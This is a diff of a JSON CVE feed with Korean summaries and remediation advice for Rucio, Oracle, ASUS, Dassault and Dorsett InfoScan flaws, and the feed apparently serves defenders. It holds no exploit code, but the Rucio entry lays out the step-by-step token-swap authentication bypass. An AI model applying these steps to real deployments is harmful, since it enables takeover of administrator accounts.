+      "remediation_ko": "① 배포 설치 파일과 구성 파일에서 민감한 호스트명 제거 여부를 점검합니다. ② 영향 버전 사용 자산과 배포본 관리 현황을 확인하고 불필요하거나 오래된 설치 파일을 정리합니다. ③ 인터넷 노출 자산이 있으면 우선 점검해 외부 획득 가능성을 줄입니다.",
+      "cvss_score": 5.3,
+      "severity": "MEDIUM",
       "epss_score": null,
       "epss_percentile": null,
       "is_kev": false,
@@ -1639,9 +1753,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -1650,11 +1766,13 @@
           "title": "Dorsett Controls InfoScan"
         }
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
+      "cwe": [
+        "CWE-497"
+      ],
+      "description_orig": "The publicly distributed InfoScan Electron installer contains configuration files identifying hostnames associated with customer installations and internal development, testing and database infrastructure. An individual who obtains and inspects the installer can extract these hostnames without authenticating to the affected systems.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -1665,13 +1783,13 @@
       ]
     },
     {
-      "cve_id": "CVE-2026-117659",
-      "title_ko": "영향 제품 인증 우회 취약점",
-      "summary_ko": "CVE-2026-117659는 영향 제품에서 확인된 인증 우회 취약점입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
-      "cvss_score": null,
-      "severity": "UNKNOWN",
+      "cve_id": "CVE-2026-120255",
+      "title_ko": "Dorsett InfoScan 하드코딩 암호키 사용 취약점",
+      "summary_ko": "Dorsett Controls InfoScan은 데이터베이스 암호화 구현에서 하드코딩된 암호키와 초기화 벡터(IV)를 사용해 MongoDB 비밀번호를 암호화한 뒤 Windows 레지스트리에 저장합니다. 암호화 재료가 배포 애플리케이션에 포함되어 있으므로, 암호화된 레지스트리 값과 애플리케이션 코드에 접근할 수 있는 개인은 데이터베이스 비밀번호를 복구할 수 있습니다. 영향 버전은 Dorsett Controls InfoScan <= 1.45.0입니다.",
+      "impact_ko": "MongoDB 비밀번호가 복구되면 데이터베이스 자격증명 노출로 이어질 수 있습니다.",
+      "remediation_ko": "① 하드코딩된 키·IV를 제거하고 안전한 키 관리 및 암호화 방식으로 전환합니다. ② 레지스트리에 저장된 암호화 값과 MongoDB 자격증명을 점검·회전하고 불필요한 저장을 줄입니다. ③ 영향 버전 자산과 배포 코드를 점검하고 인터넷 노출 자산을 우선 확인합니다.",
+      "cvss_score": 4.3,
+      "severity": "MEDIUM",
       "epss_score": null,
       "epss_percentile": null,
       "is_kev": false,
@@ -1679,9 +1797,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
-      "affected_products": [],
+      "vendor": "Dorsett Controls",
+      "product": "InfoScan",
+      "affected_products": [
+        "Dorsett Controls InfoScan <= 1.45.0"
+      ],
       "poc_count": 0,
       "poc_links": [],
       "references": [
@@ -1690,11 +1810,13 @@
           "title": "Dorsett Controls InfoScan"
         }
       ],
-      "cwe": [],
-      "description_orig": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to retrieve sensitive system information, access application data without authorization, recover stored credentials, or intercept and manipulate network communications. The following versions of Dorsett Controls InfoScan are affected: InfoScan &lt;=1.45.0 (CVE-2026-117659, CVE-2026-120157, CVE-2026-120255, CVE-2026-120260, CVE-2026-120271, CVE-2026-120298) CVSS Vendor Equipment v3 8.1 Dorsett Controls InfoScan 5 Vulnerabilities Improper Certificate Validation, Exposure of Sensitive System Information to an Unauthorized Control Sphere, Use of Hard-coded Cryptographic Key, Missing Authentication for Critical Function, Generation of Error Message Containing Sensitive Information Background Critical Infrastructure Sectors: Water and Wastewater Systems Countries/Areas Deployed: Worldwide Company Headquarters Location: United States Vulnerabilities Expand All + CVE-2026-117659 The InfoScan Electron desktop client improperly handles TLS certificate errors by accepting certificates without validating their trustworthiness. The client also configures Electron with nodeIntegration enabled, contextIsola…",
+      "cwe": [
+        "CWE-321"
+      ],
+      "description_orig": "InfoScan uses hard-coded cryptographic keys and initialization-vector values in its database-encryption implementation to encrypt the MongoDB password before storing it in the Windows registry. Because the material is embedded in the distributed application, an individual with access to the encrypted registry value and the application code may recover the database password.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget",
+      "analyzed_by": "exaone",
       "alerts": [
         {
           "source": "CISA ICS Advisory",
@@ -2375,10 +2497,10 @@
     },
     {
       "cve_id": "CVE-2026-100397",
-      "title_ko": "Rucio 인증 우회 취약점",
-      "summary_ko": "CVE-2026-100397는 Rucio에서 확인된 인증 우회 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 1.1%(악용 위험 상위 33% 수준)입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향 범위는 35.9.1·38.6.1·40.4.2 미만 버전이며, 자산 목록과 대조해 35.9.1·38.6.1·40.4.2 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Rucio 인증 토큰 검증 우회 취약점",
+      "summary_ko": "Rucio는 과학 데이터 관리 프레임워크로, 1.14.0 이상 일부 버전에서 lib/rucio/core/authentication.py의 validate_auth_token이 단기 SSH challenge nonce와 인증 토큰을 같은 토큰 테이블에서 구분하지 못한다. 비인증 공격자는 X-Rucio-Account로 임의 계정의 /auth/ssh_challenge_token을 요청하고, 반환된 X-Rucio-SSH-Challenge-Token을 X-Rucio-Auth-Token으로 제시해 다른 API 엔드포인트에 해당 계정으로 인증할 수 있으며 관리자 계정도 포함된다.",
+      "impact_ko": "공격 성공 시 임의 계정, 관리자 계정 인증 및 권한 탈취로 이어질 수 있고 API 접근 통제가 우회될 수 있다.",
+      "remediation_ko": "① 수정 버전(35.9.1, 38.6.1, 40.4.2, 41.1.1) 적용을 우선 검토한다. ② 인터넷 노출 Rucio API와 인증 엔드포인트를 점검·제한한다. ③ 인증 토큰과 SSH challenge 토큰 처리 로직 및 접근 로그를 확인한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.01143,
@@ -2435,7 +2557,7 @@
       "description_orig": "Rucio is a scientific data management framework. From 1.14.0 until 35.9.1, 38.6.1, 40.4.2, and 41.1.1, validate_auth_token in lib/rucio/core/authentication.py does not distinguish short-lived SSH challenge nonces from authentication tokens stored in the same token table. An unauthenticated attacker can request /auth/ssh_challenge_token for an arbitrary account by supplying X-Rucio-Account, then present the returned X-Rucio-SSH-Challenge-Token as X-Rucio-Auth-Token to authenticate to other API endpoints as that account, including an administrative account. This issue is fixed in versions 35.9.1, 38.6.1, 40.4.2, and 41.1.1.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129351",
@@ -2565,10 +2687,10 @@
     },
     {
       "cve_id": "CVE-2026-93664",
-      "title_ko": "Dassault Systèmes Station Launcher App in 3DEXPERIENCE platform 역직렬화 취약점",
-      "summary_ko": "CVE-2026-93664는 Dassault Systèmes Station Launcher App in 3DEXPERIENCE platform에서 확인된 역직렬화 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.7%(악용 위험 상위 46% 수준)입니다.",
-      "impact_ko": "신뢰할 수 없는 데이터가 역직렬화되면서 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Dassault 3DEXPERIENCE Station Launcher 역직렬화 취약점",
+      "summary_ko": "Dassault Systèmes 3DEXPERIENCE platform의 Station Launcher App에서 Release 3DEXPERIENCE R2023x부터 R2026x까지 영향을 받는 Deserialization of Untrusted Data 취약점이 있다. 신뢰되지 않은 데이터의 역직렬화로 인해 비인증 원격 코드 실행이 가능할 수 있다.",
+      "impact_ko": "공격 성공 시 비인증 원격 코드 실행으로 해당 시스템 장악 및 후속 공격으로 이어질 수 있다.",
+      "remediation_ko": "① 제조사 보안 권고와 업데이트를 확인하고 적용한다. ② 인터넷 노출 인스턴스를 우선 점검한다. ③ 신뢰되지 않은 데이터 역직렬화 경로를 차단·검증한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00707,
@@ -2597,14 +2719,14 @@
       "description_orig": "A Deserialization of Untrusted Data vulnerability affecting Station Launcher App in 3DEXPERIENCE platform from Release 3DEXPERIENCE R2023x through Release 3DEXPERIENCE R2026x could lead to an unauthenticated remote code execution.",
       "published_at": "2026-11-16",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114202",
-      "title_ko": "ASUS Control Center Express 보안 취약점",
-      "summary_ko": "CVE-2026-114202는 ASUS Control Center Express에서 확인된 보안 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.7%(악용 위험 상위 48% 수준)입니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "ASUS Control Center Express 하드코딩 키 취약점",
+      "summary_ko": "ASUS Control Center Express v1.7.27까지 하드코딩된 암호화 키가 사용되어, 원격 사용자가 위조된 인증 토큰으로 관리자 권한을 얻을 수 있는 취약점이 있다. ASUS 보안 권고의 'Security Update for ASUS Control Center Express Agent' 섹션을 참고해야 한다.",
+      "impact_ko": "공격 성공 시 원격 권한 상승과 관리자 권한 획득이 가능하다.",
+      "remediation_ko": "① ASUS 보안 권고를 확인해 제공된 보안 업데이트를 적용한다. ② 인터넷 노출 자산을 우선 점검한다. ③ 인증 토큰·키 관리와 접근 통제를 점검한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00662,
@@ -2633,7 +2755,7 @@
       "description_orig": "Use of Hard-coded Cryptographic Key in ASUS Control Center Express allows a remote user to gain administrative privileges via a forged authentication token. Refer to the ' Security Update for ASUS Control Center Express Agent ' section on the ASUS Security Advisory for more information.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129444",
@@ -2694,10 +2816,10 @@
     },
     {
       "cve_id": "CVE-2026-91569",
-      "title_ko": "Oracle Corporation Oracle WebLogic Server 인증 우회 취약점",
-      "summary_ko": "CVE-2026-91569는 Oracle Corporation Oracle WebLogic Server에서 확인된 인증 우회 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 55% 수준)입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle WebLogic Server 인증 누락 취약점",
+      "summary_ko": "Oracle WebLogic Server의 Oracle Fusion Middleware TopLink Integration 구성요소에 인증 누락 취약점이 있다. 영향을 받는 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0, 15.1.1.0.0 등에서 HTTP 네트워크 접근이 가능한 비인증 공격자가 WebLogic Server를 장악할 수 있으며, 범위 변경으로 추가 제품에 영향이 갈 수 있다.",
+      "impact_ko": "성공 시 Oracle WebLogic Server 장악과 기밀성·무결성·가용성 영향이 발생할 수 있다.",
+      "remediation_ko": "① Oracle 보안 권고와 Critical Patch Update를 확인해 적용한다. ② 인터넷 노출 WebLogic Server를 우선 점검한다. ③ HTTP 접근 통제와 모니터링을 강화한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00522,
@@ -2726,14 +2848,14 @@
       "description_orig": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: TopLink Integration). Supported versions that are affected are 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0 and 15.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. While the vulnerability is in Oracle WebLogic Server, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114835",
-      "title_ko": "Oracle Corporation Oracle Access Manager 인증 우회 취약점",
-      "summary_ko": "CVE-2026-114835는 Oracle Corporation Oracle Access Manager에서 확인된 인증 우회 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 55% 수준)입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Access Manager Admin Console 인증 누락 취약점",
+      "summary_ko": "Oracle Access Manager의 Admin Console 구성요소에서 인증 누락(CWE-306) 취약점이 존재한다. 영향 버전 12.2.1.4.0, 14.1.2.1.0에서 HTTP를 통한 네트워크 접근이 가능한 비인증 공격자가 쉽게 악용할 수 있으며, 취약점 자체는 Oracle Access Manager에 있으나 영향 범위가 추가 제품으로 확대될 수 있다. 공격 성공 시 Oracle Access Manager 장악으로 이어질 수 있고 CVSS 3.1 Base Score는 10.0(CRITICAL)이며 KEV 미등재, EPSS 0.5%(상위 45%)로 보고되었다.",
+      "impact_ko": "공격 성공 시 Oracle Access Manager 장악과 함께 기밀성·무결성·가용성 모두 높은 수준의 영향이 발생할 수 있다. 인터넷 노출 자산은 우선 점검 대상이다.",
+      "remediation_ko": "① 영향 버전 사용 여부와 외부 노출 Oracle Access Manager/Admin Console을 우선 점검한다. ② Oracle 공식 보안 권고를 확인해 패치 적용 가능 여부를 판단하고 적용한다. ③ 비인증 HTTP 접근 통제, 네트워크 분리, 접근·오류 로그 모니터링을 강화한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00522,
@@ -2762,14 +2884,14 @@
       "description_orig": "Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: Admin Console). Supported versions that are affected are 12.2.1.4.0 and 14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. While the vulnerability is in Oracle Access Manager, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114824",
-      "title_ko": "Oracle Corporation Oracle Platform Security for Java 역직렬화 취약점",
-      "summary_ko": "CVE-2026-114824는 Oracle Corporation Oracle Platform Security for Java에서 확인된 역직렬화 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 55% 수준)입니다.",
-      "impact_ko": "신뢰할 수 없는 데이터가 역직렬화되면서 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Platform Security for Java 역직렬화 취약점",
+      "summary_ko": "Oracle Platform Security for Java의 Centralized Thirdparty Jars 구성요소에 CWE-502 취약점이 존재한다. 영향 버전 12.2.1.4.0, 14.1.2.0.0에서 HTTP를 통한 네트워크 접근이 가능한 비인증 공격자가 쉽게 악용할 수 있으며, 취약점 자체는 해당 제품에 있으나 영향 범위가 추가 제품으로 확대될 수 있다. 공격 성공 시 Oracle Platform Security for Java 장악으로 이어질 수 있고 CVSS 3.1 Base Score는 10.0(CRITICAL)이다.",
+      "impact_ko": "공격 성공 시 Oracle Platform Security for Java 장악과 함께 기밀성·무결성·가용성 모두 높은 수준의 영향이 발생할 수 있다. 인터넷 노출 자산은 우선 점검 대상이다.",
+      "remediation_ko": "① 영향 버전 사용 여부와 외부 노출 Oracle Platform Security for Java/Centralized Thirdparty Jars를 우선 점검한다. ② Oracle 공식 보안 권고를 확인해 패치 적용 가능 여부를 판단하고 적용한다. ③ 비인증 HTTP 접근 통제, 네트워크 분리, 로그 모니터링을 강화한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00522,
@@ -2798,14 +2920,14 @@
       "description_orig": "Vulnerability in the Oracle Platform Security for Java product of Oracle Fusion Middleware (component: Centralized Thirdparty Jars). Supported versions that are affected are 12.2.1.4.0 and 14.1.2.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Platform Security for Java. While the vulnerability is in Oracle Platform Security for Java, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Platform Security for Java. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114784",
-      "title_ko": "Oracle Corporation Oracle Business Intelligence Enterprise Edition 인증 우회 취약점",
-      "summary_ko": "CVE-2026-114784는 Oracle Corporation Oracle Business Intelligence Enterprise Edition에서 확인된 인증 우회 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 55% 수준)입니다.",
-      "impact_ko": "인증 없이 보호된 기능·관리 화면에 접근해 설정 변경과 데이터 조회가 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Business Intelligence Enterprise Edition 인증 누락 취약점",
+      "summary_ko": "Oracle Business Intelligence Enterprise Edition의 Platform Security 구성요소에서 인증 누락(CWE-306) 취약점이 존재한다. 영향 버전 8.2.0.0.0, 26.01.0.0.0에서 HTTP를 통한 네트워크 접근이 가능한 비인증 공격자가 쉽게 악용할 수 있으며, 취약점 자체는 해당 제품에 있으나 영향 범위가 추가 제품으로 확대될 수 있다. 공격 성공 시 Oracle Business Intelligence Enterprise Edition 장악으로 이어질 수 있고 CVSS 3.1 Base Score는 10.0(CRITICAL)이다.",
+      "impact_ko": "공격 성공 시 해당 제품 장악과 함께 기밀성·무결성·가용성 모두 높은 수준의 영향이 발생할 수 있다. 인터넷 노출 자산은 우선 점검 대상이다.",
+      "remediation_ko": "① 영향 버전 사용 여부와 외부 노출 BI EE/Platform Security를 우선 점검한다. ② Oracle 공식 보안 권고를 확인해 패치 적용 가능 여부를 판단하고 적용한다. ③ 비인증 HTTP 접근 통제, 네트워크 분리, 로그 모니터링을 강화한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00522,
@@ -2834,14 +2956,14 @@
       "description_orig": "Vulnerability in the Oracle Business Intelligence Enterprise Edition product of Oracle Analytics (component: Platform Security). Supported versions that are affected are 8.2.0.0.0 and 26.01.0.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Business Intelligence Enterprise Edition. While the vulnerability is in Oracle Business Intelligence Enterprise Edition, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Business Intelligence Enterprise Edition. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-91510",
-      "title_ko": "Oracle Corporation Oracle Access Manager 서비스 거부(DoS) 취약점",
-      "summary_ko": "CVE-2026-91510는 Oracle Corporation Oracle Access Manager에서 확인된 서비스 거부(DoS) 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 60% 수준)입니다.",
-      "impact_ko": "반복 요청으로 서비스 응답이 멈추거나 지연되어 정상 사용자가 서비스를 이용하지 못합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Access Manager 인증 엔진 취약점",
+      "summary_ko": "Oracle Access Manager의 Authentication Engine 구성요소에서 인증되지 않은 공격자가 HTTP를 통해 악용할 수 있는 취약점이 존재한다. 영향 버전 12.2.1.4.0, 14.1.2.1.0에서 네트워크 접근이 가능한 비인증 공격자가 쉽게 악용할 수 있으며, 취약점 자체는 Oracle Access Manager에 있으나 영향 범위가 추가 제품으로 확대될 수 있다. 공격 성공 시 중요 데이터 또는 Oracle Access Manager 접근 가능 데이터의 무단 생성·삭제·수정, 중요 데이터 무단 접근, 전체 접근, 부분 서비스 거부를 유발할 수 있고 CVSS 3.1 Base Score는 10.0(CRITICAL)이다.",
+      "impact_ko": "공격 성공 시 중요 데이터 또는 Oracle Access Manager 접근 가능 데이터의 무단 생성·삭제·수정과 무단 접근, 부분 DoS가 발생할 수 있다. 인터넷 노출 자산은 우선 점검 대상이다.",
+      "remediation_ko": "① 영향 버전 사용 여부와 외부 노출 Oracle Access Manager/Authentication Engine을 우선 점검한다. ② Oracle 공식 보안 권고를 확인해 패치 적용 가능 여부를 판단하고 적용한다. ③ 인증 경계 강화, 비인증 HTTP 접근 통제, 네트워크 분리, 로그 모니터링을 수행한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00456,
@@ -2868,14 +2990,14 @@
       "description_orig": "Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: Authentication Engine). Supported versions that are affected are 12.2.1.4.0 and 14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. While the vulnerability is in Oracle Access Manager, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Access Manager accessible data as well as unauthorized access to critical data or complete access to all Oracle Access Manager accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Access Manager. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-91500",
-      "title_ko": "Oracle Corporation Oracle Access Manager 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-91500는 Oracle Corporation Oracle Access Manager에서 확인된 접근 제어 미흡 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 60% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Access Manager 인증 엔진 취약점",
+      "summary_ko": "Oracle Access Manager의 Authentication Engine 구성 요소에 CWE-284 접근통제 취약점이 존재한다. HTTP를 통한 네트워크 접근이 가능한 비인증 공격자가 악용할 수 있으며, 지원 버전 12.2.1.4.0 및 14.1.2.1.0이 영향을 받는다. 공격 성공 시 중요 데이터의 생성·삭제·수정, 중요 데이터 접근, 부분적 서비스 거부가 발생할 수 있고 범위 변경으로 추가 제품에도 영향이 가능하다.",
+      "impact_ko": "비인증 공격자가 Oracle Access Manager의 중요 데이터를 무단 생성·삭제·수정하거나 열람할 수 있고, 부분적 서비스 중단을 유발할 수 있다. 범위 변경으로 추가 제품에도 영향이 미칠 수 있다.",
+      "remediation_ko": "① 인터넷에 노출된 Oracle Access Manager 자산을 우선 점검하고 HTTP 접근 통제를 검토한다. ② 지원 버전 12.2.1.4.0, 14.1.2.1.0 사용 여부와 Oracle 보안 패치·완화 조치를 확인해 적용한다. ③ 인증·접근 로그를 모니터링해 비정상 요청과 데이터 변경을 탐지한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": 0.00456,
@@ -2904,7 +3026,7 @@
       "description_orig": "Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: Authentication Engine). Supported versions that are affected are 12.2.1.4.0 and 14.1.2.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. While the vulnerability is in Oracle Access Manager, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Access Manager accessible data as well as unauthorized access to critical data or complete access to all Oracle Access Manager accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Access Manager. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-53998",
@@ -3001,10 +3123,10 @@
     },
     {
       "cve_id": "CVE-2026-95787",
-      "title_ko": "Hewlett Packard Enterprise (HPE) ArubaOS (AOS) 권한 상승 취약점",
-      "summary_ko": "CVE-2026-95787는 Hewlett Packard Enterprise (HPE) ArubaOS (AOS)에서 확인된 권한 상승 취약점입니다. CVSS 10점(치명적)으로 평가됐습니다.",
-      "impact_ko": "낮은 권한의 사용자가 관리자 수준 권한을 얻어 시스템 전반을 통제할 수 있습니다.",
